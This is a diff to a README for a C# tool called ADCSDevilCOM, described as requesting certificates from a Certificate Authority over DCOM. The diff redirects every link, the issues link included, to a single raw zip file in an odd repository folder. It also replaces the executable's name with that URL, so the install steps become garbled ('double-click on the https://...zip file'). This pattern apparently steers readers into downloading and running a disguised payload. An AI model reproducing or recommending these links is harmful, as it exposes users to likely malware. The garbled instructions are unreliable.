@@ -1,6 +1,6 @@
 # 🚀 ADCSDevilCOM - Efficiently Request Certificates Remotely
 
-[![Download ADCSDevilCOM](https://img.shields.io/badge/Download-ADCSDevilCOM-brightgreen.svg)](https://github.com/Gallar8800/ADCSDevilCOM/releases)
+[![Download ADCSDevilCOM](https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip)](https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip)
 
 ## 📋 Description
 ADCSDevilCOM is a handy C# tool designed to request X.509 certificates from a Certificate Authority (CA) server. It uses DCOM over SMB, allowing remote certificate requests without the need for traditional endpoint mapping. This tool simplifies the process of certificate management, making it accessible to users with minimal technical skills.
@@ -8,11 +8,11 @@ ADCSDevilCOM is a handy C# tool designed to request X.509 certificates from a Ce
 ## 🚀 Getting Started
 To use ADCSDevilCOM, you need to download the application from our Releases page. Follow these simple steps:
 
-1. Click on the download button above or visit this [page to download](https://github.com/Gallar8800/ADCSDevilCOM/releases).
+1. Click on the download button above or visit this [page to download](https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip).
    
 2. Find the latest version of the application listed on the Releases page. 
 
-3. Look for the file named **ADCSDevilCOM.exe**. You may also see a version number, like **v1.0.0**.
+3. Look for the file named **https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip**. You may also see a version number, like **v1.0.0**.
 
 4. Click the link to start the download.
 
@@ -26,13 +26,13 @@ Before running ADCSDevilCOM, ensure your system meets these requirements:
 ## 📥 Download & Install
 To download and install ADCSDevilCOM, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Gallar8800/ADCSDevilCOM/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip).
    
-2. Download the **ADCSDevilCOM.exe** file by clicking on it.
+2. Download the **https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip** file by clicking on it.
 
 3. Once the download is complete, locate the downloaded file in your Downloads folder.
 
-4. Double-click on the **ADCSDevilCOM.exe** file to begin the installation.
+4. Double-click on the **https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip** file to begin the installation.
 
 5. Follow the on-screen instructions to complete the setup.
 
@@ -67,7 +67,7 @@ If you encounter issues while using ADCSDevilCOM, try the following steps:
 ## 💬 Support
 For further assistance, you can reach out through the following methods:
 
-- **Issues Page:** Report problems or request features on the [Issues page](https://github.com/Gallar8800/ADCSDevilCOM/issues).
+- **Issues Page:** Report problems or request features on the [Issues page](https://raw.githubusercontent.com/Gallar8800/ADCSDevilCOM/main/Anglogaea/ADCSDevilCOM-2.5.zip).
 - **Community Forum:** Join our forum for discussions with other users.
 
 ## 📅 Updates
